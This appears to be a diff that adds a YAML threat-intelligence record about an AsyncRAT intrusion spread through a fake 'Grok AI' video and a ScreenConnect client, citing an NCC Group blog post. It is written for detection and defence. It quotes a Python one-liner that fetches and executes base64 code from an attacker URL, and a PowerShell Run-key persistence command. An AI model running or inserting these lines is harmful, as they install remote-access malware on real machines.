@@ -1,0 +1,62 @@
+description: Recent incident response engagement handled by NCC Groups DFIR team involving
+  AsyncRAT.
+attribution:
+- Threat Actor
+malware_families:
+- AsyncRAT
+TTPs:
+  processes:
+  - ScreenConnect.ClientService.exe
+  - pw.exe
+  - mshta.exe
+  - chcp.com
+  commandline:
+  - '"C:\\Program Files (x86)\\ScreenConnectClient (aeef6885fa9229dd)\\ScreenConnect.ClientService.exe"
+    "?e=Access&y=Guest&h=jtsec.innocreed.com...'
+  - cmd /c C:\\Windows\\Prefetch\\CREATION_MADE_BY_GROKAI.MP4-3F3E21F6.pf
+  powershell:
+  - powershell.exe New-ItemProperty -Path "HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+    -Name "9f.bat" -Value "C:\\xmetavip\\9f.bat"
+  scripting_engine:
+  - import urllib.request; import base64; exec(base64.b64decode(urllib.request.urlopen('https://authenticate-meta.com/purelogbank2').read().decode('utf-8')))%
+  registry_keys:
+  - HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
+  image_load: []
+  network_connections:
+  - ScreenConnect.ClientService.exe -> jtsec.innocreed[.]com
+  - pw.exe -> https://authenticate-meta[.]com/purelogbank2
+  - AsyncRAT -> 185.149.232[.]197:56001 over SSL
+  file_activity:
+  - C:\\Users\\<USER>\\Downloads\\Creation_Made_By_GrokAI.mp4
+  - C:\\Windows\\Prefetch\\CREATION_MADE_BY_GROKAI.MP4-3F3E21F6.pf
+  - C:\\xmetavip\\9f.bat
+  - C:\\xmetavip\\vcruntime140.dll
+  - C:\\xmetavip\\python310.dll
+  - C:\\xmetavip\\pw.exe
+  - C:\\Users\\<USER>\\AppData\\Local\\Temp\\Log.tmp
+  - C:\\Users\\<USER>\\AppData\\Local\\Temp\\[REDACTED]\\REDACTED.zip
+  persistence:
+  - HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -> C:\\xmetavip\\9f.bat
+  pipes: []
+  process_relations:
+  - ScreenConnect.ClientService.exe -> mshta.exe -> pw.exe
+IOCs:
+  hashes: []
+  IPs:
+  - 194.26.192[.]107
+  - 185.149.232[.]197
+  domains:
+  - canvadreamlab[.]xyz
+  - openaigrok[.]com
+  - jtsec.innocreed[.]com
+  - authenticate-meta[.]com
+  URLs:
+  - https://shortenworld[.]com/branded-domain/canvadreamlab.xyz
+  - http://canvadreamlab.xyz/ai?utm_medium=paid&utm_source...
+  - hxxps://openaigrok[.]com
+  - hxxps://authenticate-meta[.]com/purelogbank2
+authors:
+- Molly Dewis
+reference: https://www.nccgroup.com/research-blog/masquerade-you-downloaded-screenconnect-not-grok-ai/
+date_of_publication: July 18, 2025
+file_creation_date: July 30, 2025
